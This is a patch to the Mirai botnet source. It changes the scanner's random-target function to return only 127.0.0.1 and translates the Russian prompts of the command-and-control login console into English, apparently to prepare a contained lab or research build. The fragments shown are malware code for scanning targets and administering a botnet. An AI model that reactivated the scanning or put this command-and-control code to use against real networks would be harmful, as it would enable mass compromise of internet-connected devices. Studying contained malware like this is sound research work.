@@ -34,6 +34,20 @@ index 8c0510f..df269ac 100755
  #endif
  
      while (TRUE)
+diff --git a/mirai/bot/scanner.c b/mirai/bot/scanner.c
+index 615aa93..e7d6374 100755
+--- a/mirai/bot/scanner.c
++++ b/mirai/bot/scanner.c
+@@ -700,7 +700,8 @@ static ipv4_t get_random_ip(void)
+           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+     );
+ 
+-    return INET_ADDR(o1,o2,o3,o4);
++    // return INET_ADDR(o1,o2,o3,o4);
++    return INET_ADDR(127, 0, 0, 1);
+ }
+ 
+ static int consume_iacs(struct scanner_connection *conn)
 diff --git a/mirai/bot/table.c b/mirai/bot/table.c
 index 13b341e..18ffc79 100755
 --- a/mirai/bot/table.c
@@ -73,7 +87,7 @@ index 51afd44..25720de 100755
      gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
      gcc -std=c99 tools/badbot.c -g -o debug/badbot
 diff --git a/mirai/cnc/admin.go b/mirai/cnc/admin.go
-index 28a2091..61638c6 100755
+index 28a2091..352af43 100755
 --- a/mirai/cnc/admin.go
 +++ b/mirai/cnc/admin.go
 @@ -5,7 +5,6 @@ import (
@@ -84,7 +98,7 @@ index 28a2091..61638c6 100755
      "strconv"
  )
  
-@@ -25,12 +24,8 @@ func (this *Admin) Handle() {
+@@ -25,17 +24,13 @@ func (this *Admin) Handle() {
          this.conn.Write([]byte("\033[?1049l"))
      }()
  
@@ -98,6 +112,40 @@ index 28a2091..61638c6 100755
      this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
  
      // Get username
+     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
+     username, err := this.ReadLine(false)
+     if err != nil {
+         return
+@@ -43,7 +38,7 @@ func (this *Admin) Handle() {
+ 
+     // Get password
+     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
+     password, err := this.ReadLine(true)
+     if err != nil {
+         return
+@@ -53,15 +48,15 @@ func (this *Admin) Handle() {
+     this.conn.Write([]byte("\r\n"))
+     spinBuf := []byte{'-', '\\', '|', '/'}
+     for i := 0; i < 15; i++ {
+-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
++        this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
+         time.Sleep(time.Duration(300) * time.Millisecond)
+     }
+ 
+     var loggedIn bool
+     var userInfo AccountInfo
+     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
+-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
+-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
++        this.conn.Write([]byte("\r\033[32;1mUnknown error occurred!\r\n"))
++        this.conn.Write([]byte("\033[31mPress any key to exit.\033[0m"))
+         buf := make([]byte, 1)
+         this.conn.Read(buf)
+         return
 diff --git a/scripts/db.sql b/scripts/db.sql
 index 6d873dc..fc660c6 100644
 --- a/scripts/db.sql
